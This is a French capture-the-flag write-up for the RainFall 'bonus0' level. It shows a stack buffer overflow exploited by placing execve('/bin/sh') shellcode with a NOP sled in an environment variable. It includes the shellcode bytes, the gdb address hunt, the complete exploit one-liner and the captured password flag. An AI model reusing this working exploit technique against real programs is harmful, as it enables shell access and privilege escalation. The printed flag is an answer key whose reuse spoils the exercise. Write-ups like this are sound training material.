Ici on a un executable `bonus0`, le main appelle la fonction `pp` qui appelle `p` 2 fois

La fonction `p` appelle `read` qui va lire depuis l'entree standard

Apres plusieurs test on voit que 20 * "A" en premiere entree et 20 * "B" en deuxieme fait segfault
```sh
bonus0@RainFall:~$ ./bonus0 
 - 
AAAAAAAAAAAAAAAAAAAA
 - 
BBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
Segmentation fault (core dumped)
```
On va chercher l'offset en utilisant [ce lien](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), l'offset est de 9 char

On va vouloir provoquer le segfault pour executer un shellcode `execve(/bin/sh)` comme dans le level9

En revanche il n'y pas pas de malloc (donc pas possible de stocker sur la heap) et le `strncpy` ne copie que 20 char donc on peut pas utiliser la stack

On va donc passer notre shellcode en variable d'environnement, il faut dabord voir a quelles adresses elles sont

On va en creer une avec notre shellcode :

`export SCRIPT=$(python -c 'print "\x90" * 80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')`

PS : on va d'abord ecrire un `NOP sled` (tapis de NOP) pour securiser notre script (car on ne sait pas exactement a quelle adresse il commence une fois stocke), entre 50 et 100 pour etre sur

Ensuite dans gdb on va chercher l'adresse de notre var d'env `SCRIPT`
```sh
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) r
Starting program: /home/user/bonus0/bonus0 

Breakpoint 1, 0x080485a7 in main ()
(gdb) x/150s environ
[...]
0xbffff851:	 "/home/user/bonus0/bonus0"
0xbffff86a:	 "SHELL=/bin/bash"
0xbffff87a:	 "TERM=xterm-256color"
0xbffff88e:	 "SSH_CLIENT=192.168.56.1 56066 4242"
0xbffff8b1:	 "SSH_TTY=/dev/pts/2"
0xbffff8c4:	 "USER=bonus0"
0xbffff8d0:	 "SCRIPT=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
[...]
```
On voit qu'il faut viser une adresse supperieur a `0xbffff8d0`
```sh
(gdb) x/150wx 0xbffff8d0
0xbffff8d0:	0x49524353	0x903d5450	0x90909090	0x90909090
0xbffff8e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff8f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff900:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff910:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff920:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff930:	0x50c03190	0x732f2f68	0x622f6868	0xe3896e69
0xbffff940:	0xc289c189	0x80cd0bb0	0xcd40c031	0x534c0080
```
Donc nimporte quelle adresse qui contient les `NOP` ex : `0xbffff910 = \x10\xf9\xff\xbf`

On va donc ecrire un script qui va viser cette adresse :

`(python -c 'print "A" * 20'; python -c 'print "A" * 9 + "\x10\xf9\xff\xbf" + "A" * 7' && cat) | ./bonus0`

Enfin notre shellcode a marche donc on recupere le flag avec : `cat /home/user/bonus1/.pass`: 

`cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`